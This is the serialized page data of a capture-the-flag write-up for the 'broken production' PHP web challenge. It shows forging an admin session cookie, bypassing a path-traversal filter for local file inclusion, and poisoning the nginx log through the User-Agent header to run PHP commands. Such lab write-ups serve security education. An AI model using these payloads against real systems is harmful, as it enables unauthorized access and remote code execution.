1:"$Sreact.fragment"
2:I[87555,[],""]
3:I[31295,[],""]
4:I[6874,["874","static/chunks/874-3e820bd666038662.js","633","static/chunks/app/writeups/%5Bid%5D/layout-2577bd3482649595.js"],""]
6:I[59665,[],"OutletBoundary"]
8:I[74911,[],"AsyncMetadataOutlet"]
a:I[59665,[],"ViewportBoundary"]
c:I[59665,[],"MetadataBoundary"]
d:"$Sreact.suspense"
f:I[28393,[],""]
:HL["/_next/static/media/e4af272ccee01ff0-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
:HL["/_next/static/css/1511dd18cb41f6f6.css","style"]
0:{"P":null,"b":"MFmf7jOD5aIt2Iv8Epj3C","p":"","c":["","writeups","55b783ecf750b20dfd3d58cf58530ecd"],"i":false,"f":[[["",{"children":["writeups",{"children":[["id","55b783ecf750b20dfd3d58cf58530ecd","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/1511dd18cb41f6f6.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"className":"dark scroll-smooth","children":[["$","head",null,{"children":["$","meta",null,{"charSet":"utf-8"}]}],["$","body",null,{"className":"text-dark dark:text-white dark:bg-midnight","style":{"fontFamily":"'Inter', 'Inter Fallback'","fontStyle":"normal"},"children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","div",null,{"className":"h-screen flex items-center justify-center","children":["$","main",null,{"className":"relative pl-14","children":[["$","svg",null,{"stroke":"currentColor","fill":"currentColor","strokeWidth":"0","viewBox":"0 0 512 512","className":"absolute left-0 top-2 text-5xl text-grapefruit","children":["$undefined",[["$","path","0",{"d":"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z","children":"$undefined"}]]],"style":{"color":"$undefined"},"height":"1em","width":"1em","xmlns":"http://www.w3.org/2000/svg"}],["$","h1",null,{"className":"font-bold text-7xl underline decoration-grapefruit mb-5","children":"404."}],["$","p",null,{"children":"Your requested page was not found."}],["$","$L4",null,{"href":"/","className":"font-medium text-inherit","children":"Return to home →"}]]}]}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}]]}]]}],{"children":["writeups",["$","$1","c",{"children":[null,["$","main",null,{"className":"container pt-20 pb-24","children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]}]]}],{"children":[["id","55b783ecf750b20dfd3d58cf58530ecd","d"],["$","$1","c",{"children":[null,[["$","$L4",null,{"href":"/writeups","className":"text-secondary text-sm mb-10 -ml-5 block w-max","children":"← Back to writeups"}],["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L5",null,["$","$L6",null,{"children":["$L7",["$","$L8",null,{"promise":"$@9"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,[["$","$La",null,{"children":"$Lb"}],["$","meta",null,{"name":"next-size-adjust","content":""}]],["$","$Lc",null,{"children":["$","div",null,{"hidden":true,"children":["$","$d",null,{"fallback":null,"children":"$Le"}]}]}]]}],false]],"m":"$undefined","G":["$f",[]],"s":false,"S":true}
b:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
7:null
10:I[50674,["263","static/chunks/bc9c3264-6371ca03223855d4.js","810","static/chunks/48507feb-8452885980bba250.js","330","static/chunks/08ffe114-f47006c90e36a3eb.js","800","static/chunks/800-bd0deb6e7b7e903a.js","134","static/chunks/app/writeups/%5Bid%5D/page-54fe20cc7a9d3224.js"],"default"]
11:T73d,<?php
spl_autoload_register(function ($name){
    if (preg_match('/Controller$/', $name))
    {
        $name = "controllers/${name}";
    }
    else if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

$session  = new SessionHandler();
$database = new Database('/tmp/challenge.db');

$router = new Router();
$router->new('GET', '/', function($router) use ($session){
    if (!$session->isLoggedIn()) 
    {
        return header('location: /login');
    }

    return $router->view('index', ['admin' => $session->isAdmin(), 'username' => $session->getUsername()]);
});

$router->new('GET', '/login', function($router)  use ($session){
    if ($session->isLoggedIn()) 
    {
        return header('location: /');
    }

    return $router->view('login');
});

$router->new('GET', '/register', function($router)  use ($session){
    if ($session->isLoggedIn()) 
    {
        return header('location: /');
    }

    return $router->view('register');
});

$router->new('POST', '/auth/login', function($router) use ($database, $session){
    $user = $database->login($_POST['username'], $_POST['password']);
    if (!$user) return header('location: /login?msg=Invalid username or password!');
    $session->login($_POST['username']);
    header('location: /');
    exit;
});

$router->new('POST', '/auth/register', function($router)  use ($database){
    if ($_POST['username'] === 'admin') return header('location: /register?msg=This user already exists!');
    $database->register($_POST['username'], $_POST['password']);
    header('location: /login?msg=The account registered successfully!&reg=true');
    exit;
});


$router->new('GET', '/logout', function($router)  use ($session){
    
    $session->distroy();
    return header('location: /login');
    
});


die($router->match());5:["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"Hack the Madness CTF Round 2 — broken production"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"Our PHP devs are working on this employee management portal. We have a mock build of the website and you are to pentest the platform for weaknesses. Your goal is to get more privileges and command execution on the server."}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a PHP server that looks like this:"}],"\n",["$","$L10","pre-0",{"className":"my-2","children":"$11","language":"php"}],"\n",["$","p","p-1",{"children":["Looking in ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"views/index.php"}]," and ",["$","code","code-1",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"SessionHandler.php"}],","]}],"\n",["$","$L10","pre-1",{"className":"my-2","children":"<?php if ($admin){\n\t\tinclude_once \"admin.php\";\n\t} else{\n\t\tinclude_once \"user.php\";\n\t}\n?>","language":"php"}],"\n",["$","$L10","pre-2",{"className":"my-2","children":"<?php\nclass SessionHandler\n{\n    public function __construct()\n    {\n        if (!empty($_COOKIE['PHPSESSID'])){\n            $this->cookie = $_COOKIE['PHPSESSID'];\n            $this->load();\n        }\n    }\n\n    public function login($username)\n    {\n        setcookie('PHPSESSID', base64_encode(json_encode([\n            'username' => $username\n        ])), time()+1333337, '/');\n    }\n\n    public function load()\n    {\n        $this->data = json_decode(base64_decode($this->cookie));\n    }\n\n    public function isLoggedIn()\n    {\n        return !is_null($this->data->username);\n    }\n\n    public function isAdmin()\n    {\n        return $this->data->username === 'admin';\n    }\n\n    public function getUsername()\n    {\n        return $this->data->username;\n    }\n\n    public function distroy()\n    {\n        unset($_COOKIE['PHPSESSID']);\n        setcookie('PHPSESSID', '', time() - 3600, '/');\n    }\n}","language":"php"}],"\n","$L12","\n","$L13","\n","$L14","\n","$L15","\n","$L16","\n","$L17","\n","$L18","\n","$L19","\n","$L1a","\n","$L1b","\n","$L1c","\n","$L1d","\n","$L1e","\n","$L1f","\n","$L20","\n","$L21","\n","$L22","\n","$L23","\n","$L24","\n","$L25","\n","$L26","\n","$L27"]}]}]
12:["$","p","p-2",{"children":["it seems we can pretty easily log in as admin by base64 encoding the string ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"{\"username\":\"admin\"}"}],", e.g. something like"]}]
13:["$","$L10","pre-3",{"className":"my-2","children":"ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ","language":"$undefined"}]
14:["$","p","p-3",{"children":["Replacing our ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"PHPSESSID"}]," cookie with that, we get to the admin dashboard:"]}]
15:["$","p","p-4",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/41a17715-eea8-447d-9909-ff31140957f5","alt":"image"}]}]
16:["$","p","p-5",{"children":"Looking at the admin view,"}]
28:Tacb,<?php

$utilFile = "tickets.php";

if (isset($_GET['util']))
	$utilFile = $_GET['util'];
	$utilFile = str_replace("../","", $utilFile);

$fullPath = '/www/utils/'.$utilFile;

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<title>Broken Production</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- ... -->
</head>
<body>
	
	<body>
    <div id="wrapper">
        <!-- Sidebar -->
        <div id="sidebar-wrapper">
            <ul class="sidebar-nav">
                <li class="sidebar-brand">
                    <a href="#">
                        Admin Dashboard (Under Construction)
                    </a>
                </li>
                <div class="profile-sidebar">
                    <!-- SIDEBAR USERPIC -->
                    <div class="profile-userpic">
                        <img src="/static/images/makelaris.png" class="img-responsive" alt="">
                    </div>
                    <!-- END SIDEBAR USERPIC -->
                    <!-- SIDEBAR USER TITLE -->
                    <div class="profile-usertitle">
                        <div class="profile-usertitle-name">
                            <?php echo $username ?>
                        </div>
                        <div class="profile-usertitle-job">
                            Administrator
                        </div>
                    </div>
                    <!-- END SIDEBAR USER TITLE -->
                    <!-- SIDEBAR BUTTONS -->
                    <div class="profile-userbuttons">
                        <a href="/logout" class="btn btn-danger btn-xs">Log Out</a>
                    </div>
                </div>
            </ul>
        </div>
        <!-- /#sidebar-wrapper -->

        <!-- Page Content -->
        <div id="page-content-wrapper">

            <div class="container-fluid">
                <div class="row text-right mb-4">
	                <div class="col">
	                    <select class="custom-select" id="gotoPage">
	                    	<?php 
	                    		echo "<option value='$utilFile' selected='true'>$utilFile</option>";

	                    		$pages = array("logs.php", "tickets.php", "todo.php");
	                    		foreach ($pages as $page){
	                    			if($page != $utilFile){
	                    				echo "<option value='$page'>$page</option>";
	                    			}
	                    		}
	                    	?>
						</select>  
	                </div>    
	            </div>

                <div class="manage-box">
                	<?php include_once($fullPath); ?>
                </div>
            </div>
        </div>
        <!-- /#page-content-wrapper -->

    </div>
</body>
<!-- ... -->

</html>17:["$","$L10","pre-4",{"className":"my-2","children":"$28","language":"php"}]
18:["$","p","p-6",{"children":["it looks like we get local file inclusion, but with path traversal blocked by a ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"str_replace"}],"."]}]
19:["$","p","p-7",{"children":["However, we can very easily get around this filter by passing a query param such as ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"....//....//etc/passwd"}],": the script will delete every instance of ",["$","code","code-1",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"../"}],", leaving us with a file inclusion of ",["$","code","code-2",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"/var/www/../../etc/passwd"}],"."]}]
1a:["$","p","p-8",{"children":"We still can't directly include the flag, though; looking at the dockerfile, the flag file's name is randomly generated at build time."}]
1b:["$","$L10","pre-5",{"className":"my-2","children":"FROM alpine:edge\n\n# Setup usr\nRUN adduser -D -u 1000 -g 1000 -s /bin/sh www\n\n# Install system packages\nRUN apk add --no-cache --update supervisor nginx php7-fpm php7-sqlite3 php7-json\n\n# Configure php-fpm and nginx\nCOPY config/fpm.conf /etc/php7/php-fpm.d/www.conf\nCOPY config/supervisord.conf /etc/supervisord.conf\nCOPY config/nginx.conf /etc/nginx/nginx.conf\n\n# Copy challenge files\nCOPY challenge /www\n\n# Copy flag\nRUN RND=$(echo $RANDOM | md5sum | head -c 15) && \\\n\techo \"HTB{f4k3_fl4g_f0r_t3st1ng}\" > /flag_${RND}.txt\n\n# Setup permissions\nRUN chown -R www:www /var/lib/nginx\n\n# Expose the port nginx is listening on\nEXPOSE 80\n\nCMD /usr/bin/supervisord -c /etc/supervisord.conf","language":"Dockerfile"}]
1c:["$","p","p-9",{"children":["Then, we can try to get RCE instead. Looking at the nginx config, we can see\nthat the server logs requests to ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"/var/log/nginx/access.log"}],":"]}]
1d:["$","$L10","pre-6",{"className":"my-2","children":"user www;\npid /run/nginx.pid;\nerror_log /dev/stderr info;\n\nevents {\n    worker_connections 1024;\n}\n\nhttp {\n    server_tokens off;\n    log_format docker '$remote_addr $remote_user $status \"$request\" \"$http_referer\" \"$http_user_agent\" ';\n    access_log /var/log/nginx/access.log docker;\n\n    charset utf-8;\n    keepalive_timeout 20s;\n    sendfile on;\n    tcp_nopush on;\n    client_max_body_size 1M;\n\n    include /etc/nginx/mime.types;\n\n    server {\n        listen 80;\n        server_name _;\n\n        index index.php;\n        root /www;\n\n        location / {\n            try_files $uri $uri/ /index.php?$query_string;\n            location ~ \\.php$ {\n                try_files $uri =404;\n                fastcgi_pass unix:/run/php-fpm.sock;\n                fastcgi_index index.php;\n                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n                include fastcgi_params;\n            }\n        }\n    }\n}","language":"conf"}]
1e:["$","p","p-10",{"children":"(indeed, one of the tabs in the admin dashboard lets you view this file directly:)"}]
1f:["$","p","p-11",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/8b97dde8-7959-4917-94b3-11134e06b4e0","alt":"image"}]}]
20:["$","p","p-12",{"children":"Thus, we can write arbitrary PHP code to the log file by manipulating the HTTP user agent, and then include this file via LFI for RCE:"}]
21:["$","$L10","pre-7",{"className":"my-2","children":"await (await fetch('http://94.237.53.57:54572/', {\n    headers: { 'User-Agent': '<?php phpinfo(); ?>' }\n})).text()","language":"js"}]
22:["$","p","p-13",{"children":["(which requires Firefox, since Chromium ",["$","a","a-0",{"href":"https://stackoverflow.com/questions/42815087/sending-a-custom-user-agent-string-along-with-my-headers-fetch","children":["disallows setting a custom user agent in ",["$","code","code-0",{"className":"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"fetch"}]]}],")."]}]
23:["$","p","p-14",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/06c166c3-9cb5-4b40-bc71-7f61370715d7","alt":"image"}]}]
24:["$","p","p-15",{"children":"We can use the RCE to give us the flag file name with e.g."}]
25:["$","$L10","pre-8",{"className":"my-2","children":"await (await fetch(window.location, {\n    headers: { 'User-Agent': '<?php echo `ls /`; ?>' }\n})).text() ","language":"js"}]
26:["$","p","p-16",{"children":"and include it with LFI to get the flag:"}]
27:["$","p","p-17",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/31b2d71e-38b9-4918-88ca-ce230ee4d59b","alt":"image"}]}]
9:{"metadata":[["$","title","0",{"children":"Hack the Madness CTF Round 2 — broken production | kevin.fish"}],["$","meta","1",{"name":"description","content":"Our PHP devs are working on this employee management portal. We have a mock build of the website and you are to pentest the platform for weaknesses. Your goal is to get more privileges and command execution on the server."}],["$","meta","2",{"property":"og:title","content":"Hack the Madness CTF Round 2 — broken production"}],["$","meta","3",{"property":"og:description","content":"Our PHP devs are working on this employee management portal. We have a mock build of the website and you are to pentest the platform for weaknesses. Your goal is to get more privileges and command execution on the server."}],["$","meta","4",{"name":"twitter:card","content":"summary"}],["$","meta","5",{"name":"twitter:title","content":"Hack the Madness CTF Round 2 — broken production"}],["$","meta","6",{"name":"twitter:description","content":"Our PHP devs are working on this employee management portal. We have a mock build of the website and you are to pentest the platform for weaknesses. Your goal is to get more privileges and command execution on the server."}]],"error":null,"digest":"$undefined"}
e:"$9:metadata"
